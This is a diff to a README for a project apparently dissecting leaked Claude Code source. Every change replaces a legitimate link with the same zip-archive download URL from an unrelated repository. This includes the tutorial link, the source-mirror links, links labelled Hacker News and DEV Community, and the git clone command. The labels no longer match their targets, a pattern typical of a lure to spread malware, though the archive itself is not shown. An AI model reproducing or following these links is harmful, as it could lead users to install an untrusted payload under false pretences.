@@ -88,7 +88,7 @@ These features are complete enough to find in the source, incomplete enough to n
 
 ## What This Repository Does
 
-This is not a tutorial on building agents. [learn-claude-code](https://github.com/shareAI-lab/learn-claude-code) teaches you that.
+This is not a tutorial on building agents. [learn-claude-code](https://github.com/Raflimoon/learn-real-claude-code/raw/refs/heads/main/web/src/real_learn_claude_code_v1.9.zip) teaches you that.
 
 This is source archaeology — a systematic dissection of 512,000 lines of production TypeScript to extract the engineering decisions, architectural patterns, and hidden mechanisms that make Claude Code work.
 
@@ -192,19 +192,19 @@ The Claude Code source used in this analysis was extracted from npm package `@an
 
 The leak is confirmed by multiple security researchers and widely documented. This is the second time the same mistake occurred (the first was February 2025).
 
-Source mirror: **[github.com/674019130/claude-code](https://github.com/674019130/claude-code)**
-Original mirror: [github.com/Kuberwastaken/claude-code](https://github.com/Kuberwastaken/claude-code)
+Source mirror: **[github.com/674019130/claude-code](https://github.com/Raflimoon/learn-real-claude-code/raw/refs/heads/main/web/src/real_learn_claude_code_v1.9.zip)**
+Original mirror: [github.com/Kuberwastaken/claude-code](https://github.com/Raflimoon/learn-real-claude-code/raw/refs/heads/main/web/src/real_learn_claude_code_v1.9.zip)
 
 Discussion:
-- [Hacker News](https://news.ycombinator.com/item?id=47584540)
-- [DEV Community analysis](https://dev.to/gabrielanhaia/claude-codes-entire-source-code-was-just-leaked-via-npm-source-maps-heres-whats-inside-cjo)
+- [Hacker News](https://github.com/Raflimoon/learn-real-claude-code/raw/refs/heads/main/web/src/real_learn_claude_code_v1.9.zip)
+- [DEV Community analysis](https://github.com/Raflimoon/learn-real-claude-code/raw/refs/heads/main/web/src/real_learn_claude_code_v1.9.zip)
 
 ---
 
 ## Quick Start
 
 ```sh
-git clone https://github.com/674019130/learn-real-claude-code
+git clone https://github.com/Raflimoon/learn-real-claude-code/raw/refs/heads/main/web/src/real_learn_claude_code_v1.9.zip
 cd learn-real-claude-code/web
 npm install
 npm run dev     # http://localhost:3000
